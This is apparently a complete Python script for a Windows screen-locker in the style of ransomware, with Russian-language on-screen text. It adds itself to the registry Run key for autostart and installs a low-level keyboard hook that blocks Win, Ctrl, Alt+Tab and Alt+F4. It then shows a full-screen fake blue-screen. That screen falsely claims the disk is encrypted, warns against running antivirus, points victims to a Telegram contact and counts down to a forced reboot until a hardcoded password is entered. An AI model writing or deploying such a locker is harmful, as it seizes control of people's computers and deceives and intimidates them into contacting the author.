# -*- coding: utf-8 -*-
import tkinter as tk
import sys
import os
import subprocess
import tempfile
import threading
import traceback

HERE = os.path.dirname(os.path.abspath(__file__))
ERROR_LOG = os.path.join(HERE, "win_error.txt")

PASSWORD = "мурзик"
APP_NAME = "SystemEncryptor"
STATE_FILE = os.path.join(tempfile.gettempdir(), "winlock_state.txt")
TIMER_SECONDS = 30 * 60   # 30 минут
TG_CONTACT = "@belashuak_228"

FONT_BSOD = "Lucida Console"


def log_error(text):
    try:
        with open(ERROR_LOG, "w", encoding="utf-8") as f:
            f.write(text)
    except Exception:
        pass


# =========================================================
#  ПИКИ
# =========================================================
def play_beep(freq=880, dur=80):
    if sys.platform != "win32":
        return
    try:
        import winsound
        winsound.Beep(freq, dur)
    except Exception:
        pass


def play_beep_async(freq=880, dur=80):
    threading.Thread(
        target=play_beep, args=(freq, dur), daemon=True).start()


# =========================================================
#  АВТОЗАПУСК — напрямую pythonw.exe + win.py
# =========================================================
def install_autostart():
    if sys.platform != "win32":
        return
    try:
        import winreg

        py = sys.executable
        pyw = py.replace("python.exe", "pythonw.exe")
        if not os.path.exists(pyw):
            pyw = py

        win_path = os.path.join(HERE, "win.py")
        cmd = '"%s" "%s"' % (pyw, win_path)

        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, APP_NAME, 0, winreg.REG_SZ, cmd)
        winreg.CloseKey(key)
    except Exception:
        log_error("AUTOSTART ERROR:\n%s" % traceback.format_exc())


def remove_autostart():
    if sys.platform != "win32":
        return
    try:
        import winreg
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE)
        try:
            winreg.DeleteValue(key, APP_NAME)
        except FileNotFoundError:
            pass
        winreg.CloseKey(key)
    except Exception:
        pass


def do_restart():
    try:
        if sys.platform == "win32":
            subprocess.Popen(
                ["shutdown", "/r", "/t", "15", "/c",
                 "System will restart in 15 seconds..."],
                shell=True)
    except Exception:
        pass


# =========================================================
#  ХУК — Win, Ctrl, Alt, Q
# =========================================================
_hook_id = None
_hook_ref = None


def install_hook():
    global _hook_id, _hook_ref
    if sys.platform != "win32":
        return
    if _hook_id:
        return
    try:
        import ctypes
        from ctypes import wintypes
        user32 = ctypes.WinDLL("user32", use_last_error=True)
        WH_KEYBOARD_LL = 13

        class KB(ctypes.Structure):
            _fields_ = [
                ("vkCode", wintypes.DWORD),
                ("scanCode", wintypes.DWORD),
                ("flags", wintypes.DWORD),
                ("time", wintypes.DWORD),
                ("dwExtraInfo", ctypes.c_void_p),
            ]

        HP = ctypes.WINFUNCTYPE(ctypes.c_ssize_t, ctypes.c_int,
                                ctypes.c_void_p, ctypes.c_void_p)
        user32.SetWindowsHookExW.restype = ctypes.c_void_p
        user32.SetWindowsHookExW.argtypes = [
            ctypes.c_int, HP, ctypes.c_void_p, ctypes.c_ulong]
        user32.CallNextHookEx.restype = ctypes.c_ssize_t
        user32.CallNextHookEx.argtypes = [
            ctypes.c_void_p, ctypes.c_int,
            ctypes.c_void_p, ctypes.c_void_p]
        user32.UnhookWindowsHookEx.argtypes = [ctypes.c_void_p]
        user32.GetAsyncKeyState.restype = ctypes.c_short
        user32.GetAsyncKeyState.argtypes = [ctypes.c_int]

        VK_LWIN, VK_RWIN = 0x5B, 0x5C
        VK_TAB, VK_ESC, VK_F4 = 0x09, 0x1B, 0x73
        VK_ALT, VK_CTRL = 0x12, 0x11
        VK_Q = 0x51

        def d(v):
            return (user32.GetAsyncKeyState(v) & 0x8000) != 0

        def handler(nCode, wParam, lParam):
            if nCode < 0:
                return user32.CallNextHookEx(
                    None, nCode, wParam, lParam)
            if nCode == 0:
                kb = ctypes.cast(lParam, ctypes.POINTER(KB)).contents
                vk = kb.vkCode

                if vk in (VK_LWIN, VK_RWIN):
                    return 1
                if vk in (VK_CTRL, 0xA2, 0xA3):
                    return 1
                if vk == VK_Q:
                    return 1
                if vk == VK_TAB and d(VK_ALT):
                    return 1
                if vk == VK_F4 and d(VK_ALT):
                    return 1
                if vk == VK_ESC and d(VK_CTRL):
                    return 1
                if vk == VK_ESC and d(VK_ALT):
                    return 1
            return user32.CallNextHookEx(None, nCode, wParam, lParam)

        _hook_ref = HP(handler)
        _hook_id = user32.SetWindowsHookExW(WH_KEYBOARD_LL, _hook_ref, 0, 0)
    except Exception:
        log_error("HOOK ERROR:\n%s" % traceback.format_exc())
        _hook_id = None


def uninstall_hook():
    global _hook_id
    if sys.platform != "win32" or not _hook_id:
        return
    try:
        import ctypes
        user32 = ctypes.WinDLL("user32", use_last_error=True)
        user32.UnhookWindowsHookEx(_hook_id)
    except Exception:
        pass
    _hook_id = None


# =========================================================
#  ОКНО
# =========================================================
root = tk.Tk()
root.title("System Encryptor")
root.attributes("-fullscreen", True)
root.configure(bg="#000000")
root.attributes("-topmost", True)
root.protocol("WM_DELETE_WINDOW", lambda: None)

canvas = tk.Canvas(root, bg="#000000", highlightthickness=0)
canvas.pack(fill="both", expand=True)

W = root.winfo_screenwidth()
H = root.winfo_screenheight()
cx, cy = W // 2, H // 2


# =========================================================
#  СТАДИЯ 1 — ГЛАЗ "ВАС ЗАМЕТИЛИ"
# =========================================================
eye_state = {"active": False, "t": 0, "done": False}


def draw_eye_screen():
    canvas.delete("all")
    canvas.create_rectangle(0, 0, W, H, fill="#000000", outline="")

    color = "#f0f0f0"
    line_w = 3

    eye_half_w = 220
    eye_half_h = 110
    iris_r = 105
    dot_r = 5

    canvas.create_arc(
        cx - eye_half_w, cy - eye_half_h,
        cx + eye_half_w, cy + eye_half_h,
        start=0, extent=180,
        style="arc", outline=color, width=line_w)
    canvas.create_arc(
        cx - eye_half_w, cy - eye_half_h,
        cx + eye_half_w, cy + eye_half_h,
        start=180, extent=180,
        style="arc", outline=color, width=line_w)
    canvas.create_oval(
        cx - iris_r, cy - iris_r,
        cx + iris_r, cy + iris_r,
        outline=color, width=line_w)
    canvas.create_oval(
        cx - dot_r, cy - dot_r,
        cx + dot_r, cy + dot_r,
        fill=color, outline=color)

    canvas.create_text(
        cx, cy + eye_half_h + 80,
        text="ВАС ЗАМЕТИЛИ",
        fill=color,
        font=("Arial", 52, "bold"))


def draw_eye_frame():
    if not eye_state["active"]:
        return
    t = eye_state["t"]
    if t == 0:
        draw_eye_screen()
    eye_state["t"] += 1
    if t < 60:
        root.after(50, draw_eye_frame)
    elif not eye_state["done"]:
        eye_state["done"] = True
        root.after(300, show_screen)


# =========================================================
#  СТАДИЯ 2 — ЭКРАН БЛОКИРОВКИ
# =========================================================
timer_state = {"remaining": TIMER_SECONDS,
               "active": False,
               "job": None}

_entry_widget = {"widget": None}
_status_id = {"id": None}


def fmt_time(sec):
    h = sec // 3600
    m = (sec % 3600) // 60
    s = sec % 60
    return "%02d:%02d:%02d" % (h, m, s)


def tick_timer():
    if not timer_state["active"]:
        return

    timer_state["remaining"] -= 1
    rem = timer_state["remaining"]

    try:
        canvas.itemconfig(
            "timer_text",
            text="ДО ПЕРЕЗАГРУЗКИ: " + fmt_time(rem))
    except Exception:
        return

    if rem <= 5:
        play_beep_async(freq=1400, dur=70)
        if rem > 0:
            root.after(500,
                       lambda: play_beep_async(freq=1400, dur=70))
    else:
        play_beep_async(freq=880, dur=80)

    if rem <= 5 and rem > 0:
        try:
            canvas.itemconfig("timer_text", fill="#ffff00")
        except Exception:
            pass

    if rem <= 0:
        timer_state["active"] = False
        try:
            canvas.itemconfig("timer_text",
                              text="ПЕРЕЗАГРУЗКА...")
        except Exception:
            pass
        try:
            root.attributes("-topmost", False)
        except Exception:
            pass
        do_restart()
        return

    timer_state["job"] = root.after(1000, tick_timer)


def check_password(event=None):
    w = _entry_widget["widget"]
    if w is None:
        return
    try:
        value = w.get().strip().lower()
    except Exception:
        return

    if value == PASSWORD.lower():
        timer_state["active"] = False
        if timer_state["job"]:
            try:
                root.after_cancel(timer_state["job"])
            except Exception:
                pass
        remove_autostart()
        uninstall_hook()
        try:
            os.remove(STATE_FILE)
        except Exception:
            pass
        root.destroy()
    else:
        try:
            canvas.itemconfig(_status_id["id"],
                              text="! НЕВЕРНЫЙ ПАРОЛЬ !")
            w.delete(0, tk.END)
        except Exception:
            pass


def show_screen():
    canvas.delete("all")

    canvas.create_rectangle(0, 0, W, H,
                            fill="#0000AA", outline="")

    box_w = 760
    box_h = 500
    box_x1 = cx - box_w // 2
    box_x2 = cx + box_w // 2
    box_y1 = cy - box_h // 2
    box_y2 = cy + box_h // 2

    canvas.create_rectangle(box_x1, box_y1, box_x2, box_y2,
                            fill="", outline="#ffffff", width=1)
    canvas.create_rectangle(box_x1 + 2, box_y1 + 2,
                            box_x2 - 2, box_y2 - 2,
                            fill="", outline="#aaaaaa", width=1)

    canvas.create_rectangle(box_x1 + 6, box_y1 + 6,
                            box_x2 - 6, box_y1 + 26,
                            fill="#0000AA",
                            outline="#ffffff", width=1)
    canvas.create_text(cx, box_y1 + 16,
                       text="[ SYSTEM ENCRYPTOR ]",
                       fill="#ffffff",
                       font=(FONT_BSOD, 9, "bold"))

    text_x = box_x1 + 24
    y = box_y1 + 46
    step = 16

    lines = [
        "Обнаружена проблема, и Windows был",
        "заблокирован во избежание повреждения компьютера.",
        "",
        "SYSTEM_ENCRYPTED_HARDDISK_LOCKED",
        "",
        "Этот компьютер зашифрован и заблокирован",
        "программой System Encryptor. Все файлы на вашем",
        "жёстком диске зашифрованы.",
        "",
        "  1. НЕ выключайте компьютер вручную.",
        "  2. НЕ запускайте антивирус.",
        "  3. НЕ перезагружайте через диспетчер задач.",
        "  4. Свяжитесь с разработчиком в Telegram:",
        "",
        "        " + TG_CONTACT,
        "",
        "Техническая информация:",
        "",
        "*** STOP: 0x00000LOCK (0x000000FF,",
        "         0x00000000, 0x00000000, 0x00000000)",
    ]

    for line in lines:
        canvas.create_text(text_x, y, text=line,
                           fill="#ffffff", anchor="w",
                           font=(FONT_BSOD, 8))
        y += step

    y += 14

    canvas.create_rectangle(box_x1 + 6, y - 4,
                            box_x2 - 6, y + 20,
                            fill="#0000AA",
                            outline="#ff4444", width=1)
    canvas.create_text(cx, y + 8,
                       text="! ВАШИ ФАЙЛЫ ПОД УГРОЗОЙ УДАЛЕНИЯ !",
                       fill="#ffff00",
                       font=(FONT_BSOD, 9, "bold"))
    y += 36

    canvas.create_text(cx, y,
                       text="ДО ПЕРЕЗАГРУЗКИ: " +
                            fmt_time(timer_state["remaining"]),
                       fill="#ffffff",
                       font=(FONT_BSOD, 11, "bold"),
                       tags="timer_text")
    y += 26

    canvas.create_text(cx, y,
                       text="Введите пароль и нажмите Enter:",
                       fill="#ffffff",
                       font=(FONT_BSOD, 9, "bold"))
    y += 22

    entry_offset = y - cy

    entry = tk.Entry(
        root, show="*", justify="center",
        font=(FONT_BSOD, 11, "bold"),
        bg="#0000AA", fg="#ffffff",
        insertbackground="#ffffff",
        relief="solid", bd=1)
    entry.place(relx=0.5, rely=0.5, anchor="center",
                y=entry_offset + 12,
                width=260, height=22)
    entry.focus_force()
    entry.bind("<Return>", check_password)

    _entry_widget["widget"] = entry

    y += 34

    status = canvas.create_text(cx, y,
                                text="",
                                fill="#ff6666",
                                font=(FONT_BSOD, 9, "bold"))
    _status_id["id"] = status

    canvas.create_text(cx, H - 20,
                       text="*** STOP: 0x00000LOCK  |  Contact: "
                            + TG_CONTACT,
                       fill="#cccccc",
                       font=(FONT_BSOD, 8))

    timer_state["active"] = True
    timer_state["remaining"] = TIMER_SECONDS
    timer_state["job"] = root.after(1000, tick_timer)


# =========================================================
#  ЗАПУСК
# =========================================================
def main():
    try:
        # 1. СНАЧАЛА автозапуск — до всего остального
        install_autostart()

        # 2. Хук клавиатуры
        install_hook()

        # 3. Экран
        eye_state["active"] = True
        eye_state["t"] = 0
        eye_state["done"] = False
        root.after(200, draw_eye_frame)

        root.mainloop()
    except Exception:
        log_error("MAIN ERROR:\n%s" % traceback.format_exc())


if __name__ == "__main__":
    try:
        main()
    except Exception:
        log_error("ENTRY ERROR:\n%s" % traceback.format_exc())
    finally:
        try:
            uninstall_hook()
        except Exception:
            pass